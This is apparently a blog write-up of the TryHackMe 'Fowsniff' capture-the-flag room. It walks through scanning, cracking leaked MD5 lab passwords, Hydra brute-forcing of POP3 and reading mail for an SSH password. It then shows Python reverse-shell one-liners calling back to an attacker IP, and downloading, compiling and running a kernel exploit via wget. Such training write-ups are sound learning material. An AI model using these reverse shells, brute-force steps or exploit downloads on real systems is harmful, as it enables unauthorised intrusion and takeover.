---
title: "TryHackme: Fowsniff CTF"
author: NeoVirex
categories: [TryHackMe]
tags: [thm]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_fowsniff_ctf/
image:
  path: room-img.jpeg
description: "Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!"
---
# Fowsniff CTF

Created: March 11, 2025 11:27 AM
Finishing Date: March 9, 2025
Status: Done

## Reconnaissance

```jsx
└─$ rustscan -a 10.10.36.0  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/neo/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.36.0:22
Open 10.10.36.0:80
Open 10.10.36.0:110
Open 10.10.36.0:143
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 11:25 EDT                
Initiating Ping Scan at 11:25                                                      
Scanning 10.10.36.0 [4 ports]                                                      
Completed Ping Scan at 11:25, 0.18s elapsed (1 total hosts)                        
Initiating Parallel DNS resolution of 1 host. at 11:25                             
Completed Parallel DNS resolution of 1 host. at 11:25, 0.03s elapsed               
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]                                                                      
Initiating SYN Stealth Scan at 11:25                                               
Scanning 10.10.36.0 [4 ports]                                                      
Discovered open port 143/tcp on 10.10.36.0                                         
Discovered open port 110/tcp on 10.10.36.0                                         
Discovered open port 22/tcp on 10.10.36.0                                          
Discovered open port 80/tcp on 10.10.36.0                                          
Completed SYN Stealth Scan at 11:25, 0.16s elapsed (4 total ports)                 
Nmap scan report for 10.10.36.0                                                    
Host is up, received reset ttl 63 (0.14s latency).                                 
Scanned at 2025-04-11 11:25:47 EDT for 1s                                          
                                                                                   
PORT    STATE SERVICE REASON                                                       
22/tcp  open  ssh     syn-ack ttl 63                                               
80/tcp  open  http    syn-ack ttl 63                                               
110/tcp open  pop3    syn-ack ttl 63                                               
143/tcp open  imap    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
           Raw packets sent: 8 (328B) | Rcvd: 5 (216B)

       
```

## Service Enumeration

```jsx
└─$ ffuf -u http://10.10.36.0/FUZZ -w /usr/share/wordlists/dirb/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.36.0/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 146ms]
.htaccess               [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 145ms]
                        [Status: 200, Size: 2629, Words: 182, Lines: 77, Duration: 148ms]
.htpasswd               [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 146ms]
assets                  [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 152ms]
images                  [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 143ms]
index.html              [Status: 200, Size: 2629, Words: 182, Lines: 77, Duration: 158ms]
robots.txt              [Status: 200, Size: 26, Words: 3, Lines: 3, Duration: 146ms]
server-status           [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 142ms]
:: Progress: [4614/4614] :: Job [1/1] :: 261 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
           
```

![image.png](img1.png)

### Fowsniff Corp website

We see that in the page, it says the internal system of Fowsniff suffered a data breach and employee usernames and passwords might have been exposed. Attackers were also able to hijack the official @fowsniffcorp Twitter account, and sensitive information might be released by attackers via this account! Lets see if they already did :).

### On checking @fowsniffcorp Twitter account, we see:

![image (1).png](img2.png)

### Fowsniff Corp Twitter account

It seems it has been pwned, as suspected. The attacker seems to have leaked the passwords as can be seen in the pinned tweet. Lets open the pastebin link to see the dump.

Going to [https://pastebin.com/NrAqVeeX](https://pastebin.com/NrAqVeeX) we get the following password hashes dumped along with the email addresses:

```jsx
mauer@fowsniff
mustikka@fowsniff
tegel@fowsniff
baksteen@fowsniff
seina@fowsniff
stone@fowsniff
mursten@fowsniff
parede@fowsniff
sciana@fowsniff
```

```jsx
8a28a94a588a95b80163709ab4313aa4
ae1644dac5b77c0cf51e0d26ad6d7e56
1dc352435fecca338acfd4be10984009
19f5af754c31f1e2651edde9250d69bb
90dc16d47114aa13671c697fd506cf26
a92b8a29ef1183192e3d35187e0cfabd
0e9588cb62f4b6f27e33d449e2ba0b3b
4d6e42f56e127803285a0a7649b5ab11
f7fd98d380735e859f8b2ffbbede5a7e
```

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!Here are their email passwords dumped from their databases.They left their pop3 server WIDE OPEN, too!MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
```

| Result | Hash | Type | Result |
| --- | --- | --- | --- |
| mailcall | 8a28a94a588a95b80163709ab4313aa4 | md5 | mailcall |
| bilbo101 | ae1644dac5b77c0cf51e0d26ad6d7e56 | md5 | bilbo101 |
| apples01 | 1dc352435fecca338acfd4be10984009 | md5 | apples01 |
| skyler22 | 19f5af754c31f1e2651edde9250d69bb | md5 | skyler22 |
| scoobydoo2 | 90dc16d47114aa13671c697fd506cf26 | md5 | scoobydoo2 |
| Not found. | a92b8a29ef1183192e3d35187e0cfabd | Unknown | Not found. |
| carp4ever | 0e9588cb62f4b6f27e33d449e2ba0b3b | md5 | carp4ever |
| orlando12 | 4d6e42f56e127803285a0a7649b5ab11 | md5 | orlando12 |
| 07011972 | f7fd98d380735e859f8b2ffbbede5a7e | md5 | 07011972 |

## Vulnerability Scanning

**set rhosts 10.10.89.175**

I made a text file with all the usernames and passwords in one. Here I used:

**set user_file userfow.txt**

**set pass_file passfow.txt**

**set verbose false**

**run**

![image (11).png](img3.png)

## Exploit & Initial Access

```jsx
└─$ sudo nano hash.txt
                                                                                          
┌──(neo㉿neo)-[~/pro/fo]
└─$ sudo nano pass.txt
                                                                                          
┌──(neo㉿neo)-[~/pro/fo]
└─$ hydra -L user.txt -P pass.txt pop3://10.10.36.0   
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-11 12:15:37
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 90 login tries (l:9/p:10), ~6 tries per task
[DATA] attacking pop3://10.10.36.0:110/
[110][pop3] host: 10.10.36.0   login: seina   password: scoobydoo2
[STATUS] 83.00 tries/min, 83 tries in 00:01h, 7 to do in 00:01h, 16 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-11 12:17:02
                                                     
```

### commands

**nc 10.10.193.216 110**

**USER seina**

**PASS scoobydoo2**

**LIST**

```jsx
┌──(neo㉿neo)-[~]
└─$ nc 10.10.36.0 110     
+OK Welcome to the Fowsniff Corporate Mail Server!
seina
-ERR Unknown command.
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1280
.
RETR 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone

.

```

## Privilege Escalation

```jsx
─$ ssh baksteen@10.10.145.107
The authenticity of host '10.10.145.107 (10.10.145.107)' can't be established.
ED25519 key fingerprint is SHA256:KZLP3ydGPtqtxnZ11SUpIwqMdeOUzGWHV+c3FqcKYg0.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.145.107' (ED25519) to the list of known hosts.
baksteen@10.10.145.107's password: 

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions

   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.

Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
baksteen@fowsniff:~$ id
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
baksteen@fowsniff:~$
```

In Python, the IP address in the tuple for the socket connection must be a string. Here's the corrected version:

```bash
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.23.89.97",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'

```

---

### Alternative for a More Interactive Shell

Sometimes, using `pty.spawn` provides a more fully interactive shell. You could also try this version:

```bash
python3 -c 'import socket,os,pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.23.89.97",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/sh")'

```

---

### Explanation

- **Quotes around IP:** The IP address `"10.23.89.97"` must be a string.
- **Socket connection:** The `s.connect` method now properly takes a tuple with the IP and port.
- **Shell spawn:** Either using `subprocess.call` with `["/bin/sh","-i"]` or `pty.spawn("/bin/sh")` works. The latter often gives better interactive behavior.

Make sure you use these commands only in environments where you have permission to connect and execute such operations. Happy fuzzing and pentesting!

```jsx
(neo㉿neo)-[~/pro/fo]
└─$ nc -lvnp 1234         
listening on [any] 1234 ...
```

```jsx
baksteen@fowsniff:~$ 
baksteen@fowsniff:~$ python3 -c 'import socket,os,pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.23.89.97",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/sh")'
); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/sh")'fileno(),0 
ls
```

```jsx
└─$ nc -lvnp 1234         
listening on [any] 1234 ...
connect to [10.23.89.97] from (UNKNOWN) [10.10.145.107] 57862
$ ls
ls
Maildir  term.txt
$ cat term.txt
cat term.txt
I wonder if the person who coined the term "One Hit Wonder" 
came up with another other phrases.
$ 
```

## Privilege Escalation

I found an SSH temporary password by reading this email, which can be seen in the highlighted area of the above screenshot. The password is given below.

**SSH Temporary Password: “S1ck3nBluff+secureshell”**

Now, we have one SSH temporary password. Since the SSH port was found open in Step 2, let’s try to log in with this password. But there is one problem: we don’t have the username. We retrieved the second message and found a message that hints that it uses the username **“baksteen.”**

**RETR 2**

![image (10).png](img4.png)

We use the credentials “baksteen: S1ck3nBluff+secureshell” to log in through SSH.

**ssh** [baksteen@10.10.193.216](mailto:baksteen@10.10.193.216)

![image (9).png](img5.png)

After the login, we can see the $ sign, which indicates that this is not a root user. This means we need to spend some more time with this CTF because the target of this CTF is to take root access. I ran the **uname –a** command, which gives information about the kernel.

After getting the shell, I came to know that I have logged in as a normal user. To get the root flag, We must be the root user in this machine. Let’s not wait any longer.

![image (8).png](img6.png)

From the output of the above command, we found that it is running on Ubuntu, and the kernel version is 4.4.0.116-generic.

## **Privilege Escalation**

From our low-privileged user shell, we can enumerate the system further. Our user does not have any sudo privileges, and we cannot access any of the other user’s home directories.

In our earlier enumeration process, I found that the machine is of the old version of Ubuntu, so I search for the exploit for the same from exploit-db

![image (1).png](img7.png)

After that, I opened the ExploitDB URL and copied the download URL.

![image (2).png](img8.png)

After that, I used the wget utility to download the exploit on the attacker’s machine. Once the exploit was downloaded, I renamed it using the mv command and used the gcc compiler to compile it. Once the compiling process was completed, an exploit file was generated.

### **Commands Used:**

**cd /var/www/html/**

**wget [https://www.exploit-db.com/download/44298](https://www.exploit-db.com/download/44298)**

**mv 44298 44298.c**

**gcc 44298.c -o exploit**

**/etc/init.d/apache2 start**

**ifconfig**

![image (3).png](img9.png)

![image (4).png](img10.png)

When the exploit has successfully complied, I started the apache2 service to transfer this exploit to the target machine.

I changed my current directory to the tmp directory on the target machine and downloaded the exploit by using the wget utility. After that, I provided executable permission by using the chmod command. After that, I ran the exploit, which gave the root access of the target machine. All the commands and their output can be seen highlighted in the following screenshot.

### **Commands Used:**

**cd /tmp/**

**wget 10.9.227.16/exploit**

**chmod +x exploit**

**./exploit**

![image (7).png](img11.png)

Now we have root access to the target machine. Let’s find the flag and complete the CTF.

![image (6).png](img12.png)

I read the flag file in the tmp directory by using the cat command. The flag can be seen in the following screenshot.

![image (5).png](img13.png)

**Done!!!!!! Let us see the answers to the challenge questions now.**

What was seina’s password to the email service?

**scoobydoo2**

Looking through her emails, what was a temporary password set for her?

**S1ck3nBluff+secureshell**

<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>
